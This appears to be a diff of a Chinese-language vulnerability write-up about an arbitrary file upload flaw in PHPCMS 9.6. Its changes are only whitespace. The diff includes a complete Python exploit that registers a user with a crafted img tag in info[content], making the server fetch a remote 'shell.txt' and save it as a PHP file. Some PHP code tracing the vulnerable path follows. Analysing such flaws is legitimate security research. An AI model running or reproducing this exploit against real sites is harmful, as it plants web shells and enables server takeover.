@@ -53,32 +53,32 @@ import random
 import sys
 
 def anyfile_up(surl,url):
-   url = "{}/index.php?m=member&c=index&a=register&siteid=1".format(url)
-   data = {
-       'siteid': '1',
-       'modelid': '1',
-       'username': 'Tao{}'.format(random.randint(1,9999)),
-       'password': '123456',
-       'email': 'Tao{}@xxx.com'.format(random.randint(1,9999)),
-       'info[content]': '<img src={}?.php#.jpg>'.format(surl),
-       'dosubmit': '1',
-       'protocol': ''
-  }
-   r = requests.post(url, data=data)
-   return_url = re.findall(r'img src=(.*)>',r.text)
-   if len(return_url):
-       return return_url[0]
+   url = "{}/index.php?m=member&c=index&a=register&siteid=1".format(url)
+   data = {
+       'siteid': '1',
+       'modelid': '1',
+       'username': 'Tao{}'.format(random.randint(1,9999)),
+       'password': '123456',
+       'email': 'Tao{}@xxx.com'.format(random.randint(1,9999)),
+       'info[content]': '<img src={}?.php#.jpg>'.format(surl),
+       'dosubmit': '1',
+       'protocol': ''
+  }
+   r = requests.post(url, data=data)
+   return_url = re.findall(r'img src=(.*)>',r.text)
+   if len(return_url):
+       return return_url[0]
 if __name__ == '__main__':
-   if len(sys.argv) == 3:
-       return_url = anyfile_up(sys.argv[1],sys.argv[2])
-       print('seccess! upload file url: ', return_url)
-   else:
-       message = \
-       """
-      python3 anyfile_up.py [上传内容URL地址] [目标URL]
-      example: python3 anyfile_up.py http://www.tao.com/shell.txt http://www.phpcms96.com
-      """
-       print(message)
+   if len(sys.argv) == 3:
+       return_url = anyfile_up(sys.argv[1],sys.argv[2])
+       print('seccess! upload file url: ', return_url)
+   else:
+       message = \
+       """
+      python3 anyfile_up.py [上传内容URL地址] [目标URL]
+      example: python3 anyfile_up.py http://www.tao.com/shell.txt http://www.phpcms96.com
+      """
+       print(message)
 ```
 
 运行效果如下图：
@@ -119,11 +119,11 @@ $userinfo['from'] = isset($_SESSION['from']) ? $_SESSION['from'] : '';
 
 ```
 if($member_setting['choosemodel']) {
-   require_once CACHE_MODEL_PATH.'member_input.class.php';
-   require_once CACHE_MODEL_PATH.'member_update.class.php';
-   $member_input = new member_input($userinfo['modelid']);
-   $_POST['info'] = array_map('new_html_special_chars',$_POST['info']);
-   $user_model_info = $member_input->get($_POST['info']);// 135行，重点
+   require_once CACHE_MODEL_PATH.'member_input.class.php';
+   require_once CACHE_MODEL_PATH.'member_update.class.php';
+   $member_input = new member_input($userinfo['modelid']);
+   $_POST['info'] = array_map('new_html_special_chars',$_POST['info']);
+   $user_model_info = $member_input->get($_POST['info']);// 135行，重点
 ```
 
 走到 135 行，可以发现，这里`$_POST['info']`传入了`member_input`类中的`get`方法，跟进该方法。(该方法跳转至：`/caches/caches_model/caches_data/member_input.class.php`文件 20 行)
@@ -247,7 +247,7 @@ public static function my_path($filepath) {
 $path = pathinfo($filepath);
 if (file_exists($path['dirname'].DIRECTORY_SEPARATOR.'MY_'.$path['basename'])) {
 return $path['dirname'].DIRECTORY_SEPARATOR.'MY_'.$path['basename'];
-           // 没有 my_cache_file.class.php
+           // 没有 my_cache_file.class.php
 } else {
 return false;
 }
